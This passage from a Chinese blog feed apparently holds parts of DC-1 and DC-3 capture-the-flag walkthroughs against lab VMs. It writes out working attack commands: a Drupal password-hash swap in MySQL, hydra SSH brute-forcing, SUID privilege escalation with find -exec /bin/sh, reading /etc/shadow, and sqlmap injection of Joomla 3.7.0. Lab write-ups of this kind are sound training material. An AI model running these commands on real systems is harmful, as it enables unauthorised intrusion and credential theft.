/var/www/scripts/password-hash.sh<br></code></pre></td></tr></table></figure><p>得到结果（一些关键信息如下）：</p><p>比如，使用说明和帮助信息：支持‘–root’选项，用于将工作目录切换到drupal安装目录。所有的明文密码都必须使用双引号括起来。</p><p>“ One or more plan-text passwords enclosed by double quotes.”</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912499494.png" alt="img"></p><p>得知这个信息之后，我们可以利用这个加密脚本中的加密方法构造一个已知用户名对应的对我们而言已知的新密码。进而替换users表格中的对象。</p><p>修改目标：将用户名为admin的密码修改为’admin‘</p><p>运行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php /var/www/scripts/password-hash.sh admin<br></code></pre></td></tr></table></figure><p>注：该条命令的意思是，运行该.sh脚本，生成明文密码是“admin”的hash加密密码值。</p><p><strong>plain-pass</strong>：admin</p><p><strong>encrypt-hash-pass：</strong></p><p>$S$DwaP8RG77fiZwwCdr0LjW4BhdYIczowL4XnwXBg47LvTossBwdji</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912714433.png" alt="img"></p><p>接下来就是回到数据库中将用户名为“admin”的密码改为我们新生成的hash密码值，即修改admin用户的密码为’admin‘。</p><p>mysql -udbuser -pR0ck3t</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">use drupaldb;<br>update <span class="hljs-built_in">users</span> <span class="hljs-built_in">set</span> pass=<span class="hljs-string">&quot;$S<span class="hljs-variable">$DwaP8RG77fiZwwCdr0LjW4BhdYIczowL4XnwXBg47LvTossBwdji</span>&quot;</span> <span class="hljs-built_in">where</span> name=<span class="hljs-string">&quot;admin&quot;</span> or name=<span class="hljs-string">&quot;Fred&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912949408.png" alt="img"></p><p>验证是否成功修改，<code>select * from users；</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913292131.png" alt="img"></p><p>- </p><p>退出mysql命令行使用<code>exit</code><br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913312573.png" alt="img"></p><p>- </p><p>使用”name：admin，pass：admin“去登陆目标ip网页。得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913355053.png" alt="img"></p><p>然后我们选择上方的”content“点击，查看其内容：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913389424.png" alt="img"></p><p>发现有个”flag3“，点击，得到如下效果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913374497.png" alt="img"></p><p>访问文件<code>/etc/passwd</code>获取相关系统用户信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913409356.png" alt="img"></p><p>解释：&#x2F;etc&#x2F;passwd文件中的每条信息包含了多个字段，各个字段之间使用冒号分隔开来。</p><blockquote><p>显示字段的语法：</p><p>用户名：密码占位符（通常是’x‘）：用户ID（UID）：组ID（GID）：用户描述：家目录：登陆shell</p></blockquote><p>接下来尝试访问<code>/etc/shadow</code>文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/shadow<br></code></pre></td></tr></table></figure><p>由结果发现，由于权限不足，文件访问遭到拒绝：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240619125252692.png" alt="image-20240619125252692"></p><p>解释：&#x2F;etc&#x2F;shadow文件一般用于存储系统用户的加密密码及其相关的安全设置，通常只有系统管理员可以访问。</p><blockquote><p>显示字段的语法：（各字段使用冒号分隔）</p><p>用户名：加密密码：上次密码更改日期：密码更改最短间隔：密码更改最长间隔：密码过期警告天数：账户失效日期：保留字段</p><p>其中，加密密码通常使用的是’bcrypt’’SHA-256’或’SHA-512’等强哈希算法加密。</p></blockquote><p>回看上述获取的系统用户信息，发现近开头处有一个名为<code>root</code>的用户（doge&#x2F;），尝试使用字典爆破，看看能不能直接同时拿到登陆数据和提权。</p><p>切换回kali的root用户，使用hydra进行密码字典爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.204.129<br></code></pre></td></tr></table></figure><p>实际上，爆破的时间很长，而且，好像看不到结果（如下），所以想通过直接爆破root来获取登陆数据和实现提权是不大现实的。<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913636136.png" alt="img"></p><p>再看！近末尾处存在一个用户名为<code>flag4</code>的用户（为什么选中它就是！因为flag这个单词很熟，而且通常包含了关键信息）。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913619371.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l flag4 -P /usr/share/wordlists/rockyou.txt ssh://192.168.204.129<br></code></pre></td></tr></table></figure><p>很快地，就爆破出了这个用户的ssh登陆密码：</p><blockquote><p>flag4</p><p>orange</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913790835.png" alt="img"></p><blockquote><p>hydra（密码破解工具）使用语法：</p><p>hydra -l 单个用户名 -p 密码字典表 -e 超时重试次数 -t count -M file -T count1 -o outputfile -f pass1 -c t1 -w t2 -C t3 -R t4 -s 指定端口号 -x    -SuvVd46 其它选项 服务:&#x2F;&#x2F;服务：端口</p></blockquote><p>- </p><p><code>[-l LOGIN|-L FILE]</code>：指定单个用户名 <code>-l</code> 或从文件中读取用户名列表 <code>-L</code>。</p><p><code>[-p PASS|-P FILE]</code>：指定单个密码 <code>-p</code> 或从文件中读取密码列表 <code>-P</code>。</p><p><code>[-e ns]</code>：设置错误和超时的重试次数，默认为 5 次错误和 20 秒的超时。</p><p><code>[-t TASKS]</code>：同时运行的任务数，默认为 16。</p><p><code>[-M FILE]</code>：启用并行模式，从文件中读取主机列表。</p><p><code>[-T TASKS]</code>：每个主机并行任务数，默认为 16。</p><p><code>[-o FILE]</code>：将结果输出到文件。</p><p><code>[-f]</code>：强制使用指定的密码，即使它不工作。</p><p><code>[-c TIME]</code>：等待连接超时时间，默认为 30 秒。</p><p><code>[-w TIME]</code>：等待响应超时时间，默认为 30 秒。</p><p><code>[-C TIME]</code>：每个连接的间隔时间，默认为 0 秒。</p><p><code>[-R TIME]</code>：等待任务切换时间，默认为 0 秒。</p><p><code>[-s PORT]</code>：连接到指定端口，默认为服务的标准端口。</p><p><code>[-x MIN:MAX:CHARSET]</code>：使用指定的字符集生成密码。</p><p><code>[-SuvVd46]</code>：其他选项，例如静默模式 <code>-S</code>、详细输出 <code>-v</code>、非详细输出 <code>-V</code>、调试输出 <code>-d</code>、IPv6 支持 <code>-6</code> 等。</p><p><code>[service://server[:PORT][/OPT]]</code>：指定目标服务的协议、服务器地址和端口，以及可选的参数。</p><p>- </p><p>ok！登陆权限拿到！</p><p>返回靶机尝试登陆，发现能够成功以flag4用户的身份登陆。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913908123.png" alt="img"></p><h3 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h3><p>接下来进行提权，以获得更多有用的信息。</p><p>首先先使用<code>find</code>命令，查找具有SUID权限（拥有者&#x2F;管理者权限）的可执行二进制文件（通俗点理解就是命令，比如find这种）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>查找结果如下：</p><p>由查找结果可以发现，find命令也具有SUID权限，因而可以通过它实现提权。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913930750.png" alt="img"></p><p>输入命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name index.php -<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> \;<br></code></pre></td></tr></table></figure><p>解释：命令意思是，使用find命令，通过执行 “&#x2F;bin&#x2F;sh”文件来查找名为index.php的文件。其中，查找什么文件不重要，关键是使用具有<code>SUID权限</code>的命令去调用执行<code>-exec &quot;/bin/sh&quot;</code>。</p><p>（注意末尾的符号也需要！而且需要有个空格！！！）</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913967593.png" alt="img"></p><blockquote><p>&#x2F;bin&#x2F;sh文件：<br>是系统默认的命令行解释器，通常被称为’shell‘</p></blockquote><p>成功提权！此时也可以访问<code>/etc/shadow</code>（密码）文件了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721913992790.png" alt="img"></p><p>结束。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>DC1靶场攻打过程中使用到的相关关键操作技术：、</p><ul><li><p>首先先进行信息收集。使用<code>nmap</code>端口扫描收集开放端口信息。通过端口信息试图获取目标靶场的相关信息，比如所使用的框架等。</p></li><li><p>利用<code>msfconsole</code>寻找有关drupal CMS框架的漏洞，并利用漏洞重置<code>RHOSTS</code>字段值为目标靶机值，使用<code>run/exploit</code>命令执行。</p></li><li><p>获取shell，同样是通过<code>msfconsole</code>实现，输入<code>shell  -&gt;  ls</code>看是否成功列出目录文件，成功则表示get shell成功。输入命令<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code>开启用户交互界面（即以靶机用户身份进行后续操作）</p></li><li><p>搜索靶机框架的配置文件名，搜索其下的所有相关配置文件，并<code>cat</code>查看文件内容，试图从中获取有用的信息。</p></li><li><p>获取数据库内容之后，使用命令<code>mysql -uName -pPassword</code>尝试登陆。</p></li><li><p>使用hydra进行密码爆破</p></li><li><p>提权，首先需要查找有SUID权限的命令，<code>find / -perm -u=s -type f 2&gt;/dev/null</code>，然后执行<code>（SUID） / -name index.php -exec &quot;/bin/sh&quot; \;</code>进行提权。</p></li><li><p>检测权限属主的命令为<code>whoami和id</code></p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-3</title>
    <link href="/2024/07/24/DC-3/"/>
    <url>/2024/07/24/DC-3/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>首先，必须先确定测试机器（kali）和目标靶机处于同一个模式（这里使用NAT模式）。否则在kali端扫不出目标靶机的IP地址。</p><p>- </p><p>此外，在本次在虚拟机打开靶机的过程中，遇到了一个问题：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701215940440.png" alt="image-20240701215940440"></p><p>解决方法（亲测有用）：将CD&#x2F;DVD（IDE）选项的<code>IDE（D）</code>修改为<code>IDE 0：0</code>。</p><p><a href="https://developer.aliyun.com/article/1209515">https://developer.aliyun.com/article/1209515</a></p><p>- </p><p>然后通过开关靶机以及进行nmap网段扫描来确定靶机的IP地址。</p><p>开靶机前：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701222633001.png" alt="image-20240701222633001"></p><p>开靶机后：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701222702232.png" alt="image-20240701222702232"></p><p>通过前后nmap扫描结果的对比，可以确认目标靶机的IP地址是：<code>192.168.204.132</code></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="开放端口扫描"><a href="#开放端口扫描" class="headerlink" title="开放端口扫描"></a>开放端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN -p- 192.168.204.132<br>nmap -sT -p- 192.168.204.132<br></code></pre></td></tr></table></figure><p>扫描结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701224802419.png" alt="image-20240701224802419"></p><p>由检测结果可以看出，目标靶机开放的端口服务只有<code>80</code>端口（http协议）。接下来进行更加详细的端口扫描。</p><h3 id="详细端口扫描"><a href="#详细端口扫描" class="headerlink" title="详细端口扫描"></a>详细端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 80 192.168.204.132<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240701230223132.png" alt="image-20240701230223132"></p><p>可以看到，其开放的80端口服务有http网页相关内容的信息。但除此之外没有其它有用的信息了。所以我们可以再进行nmap漏扫，尝试获取更多有价值的信息。</p><h3 id="nmap漏扫"><a href="#nmap漏扫" class="headerlink" title="nmap漏扫"></a>nmap漏扫</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 80 192.168.204.132<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702110519853.png" alt="image-20240702110519853"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702110540612.png" alt="image-20240702110540612"></p><p>发现可能这个目标靶机网页可能存在着：</p><p><code>Joomla 中的SQL注入漏洞</code>：(SQL Injection Vulnerability)</p><blockquote><p> An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers to execute aribitrary SQL commands via unspecified vectors.</p><p> 在Joomla中存在一个SQL注入漏洞，3.7版本在3.7.1之前它允许攻击者使用未指明的变量去执行任意SQL命令。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702111339383.png" alt="image-20240702111339383"></p><p><code>DOS攻击漏洞</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702111629174.png" alt="image-20240702111629174"></p><p><code>csrf漏洞</code>：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702110758621.png" alt="image-20240702110758621"></p><p>扫描结果列举了可能存在csrf漏洞的目录：</p><blockquote><p>&#x2F;index.php</p><p>&#x2F;index.php&#x2F;component&#x2F;users&#x2F;?task&#x3D;remind.remind&amp;Itemid&#x3D;101</p><p>&#x2F;index.php&#x2F;component&#x2F;users&#x2F;?Itemid&#x3D;101</p><p>&#x2F;index.php&#x2F;component&#x2F;users&#x2F;?task&#x3D;reset.request&amp;Itemid&#x3D;101</p></blockquote><table><thead><tr><th align="left">csrf漏洞：CSRF (Cross-site request forgery，跨站请求伪造)也被称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。简单的说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作（如转账和购买商品））。因为浏览器之前认证过，所以被访问的站点会觉得这是真正的用户操作而去运行。</th></tr></thead></table><h2 id="网页信息收集"><a href="#网页信息收集" class="headerlink" title="网页信息收集"></a>网页信息收集</h2><h3 id="访问目标靶机"><a href="#访问目标靶机" class="headerlink" title="访问目标靶机"></a>访问目标靶机</h3><p>在浏览器访问目标靶机的IP地址<code>192.168.204.132</code></p><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702104858844.png" alt="image-20240702104858844"></p><p>其中的提示信息为：</p><blockquote><p>This time, there is only one flag, one entry point and no clues.</p><p>To get the flag, you’ll obviously have to gain root privileges.</p><p>How you get to be root is up to you - and, obviously, the system.</p><p>Good luck - and I hope you enjoy this little challenge.</p><p>这次只有一个flag，一个入口并且没有提示。为了获取flag，你需要获得root权限。如何获得root权限取决于你自己，当然，也取决于系统。祝你好运，我希望你能享受这个挑战。</p></blockquote><h3 id="指纹工具识别技术构成"><a href="#指纹工具识别技术构成" class="headerlink" title="指纹工具识别技术构成"></a>指纹工具识别技术构成</h3><p>使用浏览器插件<code>Wappalyzer</code>进行指纹识别，进行网页技术构成识别。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702113249330.png" alt="image-20240702113249330"></p><p>可以看到，这个网页使用的是<strong>Joomla CMS</strong>框架，Joomia在前面进行nmap漏扫的时候也出现过捏！使用的编程语言是<strong>PHP</strong>，操作系统是<strong>Ubuntu</strong>。</p><h2 id="gubuster目录爆破"><a href="#gubuster目录爆破" class="headerlink" title="gubuster目录爆破"></a>gubuster目录爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.132 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702184616071.png" alt="image-20240702184616071"></p><p>得到的目录信息：</p><blockquote><p> <a href="http://192.168.204.132/media/">http://192.168.204.132/media/</a></p><p> <a href="http://192.168.204.132/templates/">http://192.168.204.132/templates/</a></p><p> <a href="http://192.168.204.132/modules/">http://192.168.204.132/modules/</a></p><p> <a href="http://192.168.204.132/images/">http://192.168.204.132/images/</a></p><p> <a href="http://192.168.204.132/bin/">http://192.168.204.132/bin/</a></p><p> <a href="http://192.168.204.132/plugins/">http://192.168.204.132/plugins/</a></p><p> <a href="http://192.168.204.132/includes/">http://192.168.204.132/includes/</a></p><p> <a href="http://192.168.204.132/language/">http://192.168.204.132/language/</a></p><p> <a href="http://192.168.204.132/components/">http://192.168.204.132/components/</a></p><p> <a href="http://192.168.204.132/cache/">http://192.168.204.132/cache/</a></p><p> <a href="http://192.168.204.132/libraries/">http://192.168.204.132/libraries/</a></p><p> <a href="http://192.168.204.132/tmp/">http://192.168.204.132/tmp/</a></p><p> <a href="http://192.168.204.132/layouts/">http://192.168.204.132/layouts/</a></p><p> <a href="http://192.168.204.132/administrator/">http://192.168.204.132/administrator/</a></p><p> <a href="http://192.168.204.132/cli/">http://192.168.204.132/cli/</a></p></blockquote><p>发现了管理员目录，即后台管理系统 <code>http://192.168.204.132/administrator/</code>欸！！</p><p>试着在网页进行访问：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702185113830.png" alt="image-20240702185113830"></p><p>接下来的思路是寻找可通过认证的用户账号，即用户名和密码。</p><h2 id="漏洞搜索"><a href="#漏洞搜索" class="headerlink" title="漏洞搜索"></a>漏洞搜索</h2><h3 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a>searchsploit</h3><p>使用<code>searchsploit</code>进行漏洞搜索。</p><p>- </p><p>在前面两个靶场中，我们都是使用kali自带的msfconsole来进行漏洞查询，那为什么在这个靶场就要使用searchsploit了呢？searchsploit和msfconsole有什么区别？</p><blockquote><ul><li><p>searchsploit</p><p>功能：用于搜索漏洞利用代码，是一个命令行工具。</p><p>用途：主要用于查找已知漏洞的利用代码。</p></li><li><p>msfconsole</p><p>功能：是metasploit框架的命令行接口，包含了大量的漏洞利用模块。</p><p>用途：主要用于执行漏洞渗透测试活动，包括选择合适的漏洞利用模块，设置payload，执行渗透攻击，获取远程访问权限等。</p></li></ul></blockquote><p>- </p><p>前面 nmap漏扫 以及 后面的 gubuster目录爆破的后台管理界面 已经提示得不能再明显了，是Joomla！所以此处我们直接针对这个漏洞使用searchsploit。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit Joomla<br></code></pre></td></tr></table></figure><p>找到非常多该漏洞的可利用代码文件：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702191749731.png" alt="image-20240702191749731"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702191823709.png" alt="image-20240702191823709"></p><p>根据前面进行nmap漏扫得到的结果显示，目标靶机使用的Joomla版本为3.7.0。因此，我们可以进行更详细的searchsploit搜索。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit Joomla 3.7.0<br></code></pre></td></tr></table></figure><p>得到的结果很精炼，可以利用SQL注入以及CSS攻击：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702192127253.png" alt="image-20240702192127253"></p><p>查看其详细信息：</p><p>如何查看<code>php/webapps/42033.txt</code>以及<code>php/webapps/43488.txt</code>代码文件？</p><p>答：使用searchsploit。使用<code>searchsploit -p 42033/43488.txt </code> 命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -p 42033.txt<br>searchsploit -p 43488.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702193128571.png" alt="image-20240702193128571"></p><p>在详细信息中，可利用代码文件的路径path被展示出来。</p><ul><li>SQL注入</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span>  /usr/share/exploitdb/exploits/php/webapps/42033.txt   <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702193539768.png" alt="image-20240702193539768"></p><p>可以从中得到该SQL注入漏洞利用的使用方法，利用sqlmap：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br></code></pre></td></tr></table></figure><ul><li>CSS攻击</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /usr/share/exploitdb/exploits/php/webapps/43488.txt  <br></code></pre></td></tr></table></figure><blockquote><p>CSS攻击是一种利用浏览器对CSS的解析和应用来实施的安全攻击。通过利用浏览器在渲染网页时对CSS的强大控制能力，通过构造恶意的CSS代码来实现攻击的目的。常见的CSS攻击方式有：CSS注入攻击、CSS选择器攻击、CSS历史攻击、针对特定浏览器漏洞的攻击等等。</p></blockquote><p>有关于该漏洞利用的概要介绍为:</p><blockquote><ol><li>Description（描述）</li></ol><p>Whenever a user edits a message with &lt;\textarea&gt; inside the body, everything after the &lt;\textarea&gt; will be executed in the user’s browser. Works with every version up to 4.0.20</p><p>无论何时用户在正文中使用&lt;\textarea&gt;编辑信息时，&lt;\textarea&gt;时候的任意内容都会在用户的浏览器中被执行。这一特性适用于4.0.20之前的版本。</p><ol start="2"><li>Proof of Concept（概念验证）</li></ol><p>Login with permissions to post a message, insert &lt;\textarea&gt; in the body and add any html code after that, whenever a user tries to edit that message the code writed after you closed the textarea will be executed</p><p>获取相应权限登陆以发布信息，在主体中插入 &lt;\textarea&gt; 并在它后面添加任意html代码，无论何时用户尝试去编辑这些信息，那些被写在 &lt;\textarea&gt; 后面的代码都会被执行。</p><ol start="3"><li>Solution:（解决方案）</li></ol><p>Update to version 4.0.21<br><a href="https://stackideas.com/blog/easydiscuss4021-update">https://stackideas.com/blog/easydiscuss4021-update</a></p><p>将版本更新到4.0.21</p></blockquote><h3 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h3><p>意思意思吧，万一有比SQL注入更简便的方法呢？或许直接有用户的数据库呢？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br><br>search Joomla<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702200337335.png" alt="image-20240702200337335"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702202047792.png" alt="image-20240702202047792"></p><p>可以看到，有关于Joomla的漏洞还挺多！</p><p>在前面的nmap漏扫，以及上面的searchsploit（附带版本号）的查询结果，都提到了SQL注入。</p><p>在上述msfconsole的搜索结果中，在rank等级为<code>excellent</code>，又比较新的漏洞中查找有关于SQL注入的漏洞，并尝试利用它：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702202404808.png" alt="image-20240702202404808"></p><p>好！6号漏洞<code>exploit/unix/webapp/joomla_comfields_sqli_rce </code>申请出战！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/unix/webapp/joomla_comfields_sqli_rce<br><br>show options<br><br><span class="hljs-built_in">set</span> RHOSTS 192.168.204.132<br><br>show options<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702202620785.png" alt="image-20240702202620785"></p><p>执行<code>run/exploit</code>:<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702202723977.png" alt="image-20240702202723977"></p><p>发现均没有 session 被创建，即利用失败！对<code>msfconsole</code>搜索出来的漏洞利用失败，所以我们还是得回去尝试通过<code>searchsploit</code>搜索得到的可利用代码文件以及利用方法了。</p><h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><p>根据上一节<code>searchsploit</code>搜索得到的信息对目标靶机进行sqlmap注入测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.204.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]<br></code></pre></td></tr></table></figure><p><code>--dbs</code>：指示 sqlmap 列出目标数据库服务器中的所有数据库</p><p>注入结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702203426962.png" alt="image-20240702203426962"></p><p>失败了。。。。。？？？？</p><p>哦！注意！利用文件中给出的利用方法中，给出的URL中的<code>localhost</code>字段需要自己手动修改成目标靶机的IP地址。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240702204349894.png" alt="image-20240702204349894"></p><p>得到的信息有：</p><blockquote><p>可用的数据库有：</p><p>information_schema<br><strong>joomladb</strong>    <strong>！！！！</strong><br>mysql<br>performance_schema<br>sys</p></blockquote><p>对其中最可能含有有价值信息的joomladb数据库进行进一步的访问，指定列出joomladb数据库的所有表。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.204.132/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]<br></code></pre></td></tr></table></figure><p><code>-u</code>：指明目标URL</p><p><code>-D</code>：指定目标数据库的名称</p><p><code>--riks</code>：设置SQL注入的风险级别，数字越高表示尝试更高风险的注入测试。</p><p><code>--level</code>：设置测试的深度级别，数字越高表示尝试更深入的注入测试。</p><p><code>--random-agent</code>该参数使得每次请求都使用一个随机的User-Agent头部，这有助于隐藏 sqlmap 的请求特征，增加匿名性。</p><p><code>--tables</code>：参数指示sqlmap列出目标数据库中的所有表名。</p><p><code>-P list[fullordering]</code>：-p参数指定了用于注入的URL参数名：list[fullordering]这是一个潜在的注入点，sqlmap将尝试利用这个参数进行SQL注入测试。</p><p><img 